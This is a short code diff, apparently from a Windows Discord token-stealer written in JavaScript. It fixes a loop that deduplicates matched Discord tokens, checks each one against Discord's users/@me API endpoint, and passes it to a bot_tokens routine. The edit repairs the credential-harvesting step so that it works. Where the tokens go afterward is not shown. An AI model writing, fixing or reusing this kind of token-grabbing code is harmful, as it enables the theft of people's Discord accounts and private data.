@@ -23,7 +23,7 @@ if (process.platform === "win32") {
             if (match) {
               const dui = [...new Set(match)];
               for (let i = 0; i < dui.length; i++) {
-                fetch_token("https://discord.com/api/v6/users/@me", uniq[i]);
+                fetch_token("https://discord.com/api/v6/users/@me", dui[i]);
                 bot_tokens(dui[i]);
               }
             }
